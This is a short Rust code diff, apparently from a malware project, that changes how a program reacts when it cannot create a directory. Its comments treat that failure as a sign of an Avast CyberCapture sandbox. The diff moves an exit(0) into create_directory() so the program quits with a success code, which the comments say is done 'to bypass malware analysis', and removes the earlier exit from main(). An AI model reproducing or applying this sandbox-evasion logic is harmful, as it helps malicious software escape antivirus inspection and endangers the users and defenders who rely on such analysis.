@@ -211,7 +211,7 @@ fn create_directory() -> io::Result<()> {
         }
         Err(e) => {
             eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
-            Err(e) // Return the error to the caller
+            exit(0); // Exit the program with an success code to bypass malware analysis
         }
     }
 }
@@ -299,7 +299,6 @@ fn main() {
     if let Err(e) = create_directory() {
         // Handle the error if the directory creation fails
         eprintln!("Error creating directory: {}", e);
-        exit(0); // Exit the program with an success code to bypass malware analysis
     } else {
         // Directory creation was successful
         println!("Directory was created without any issues.");
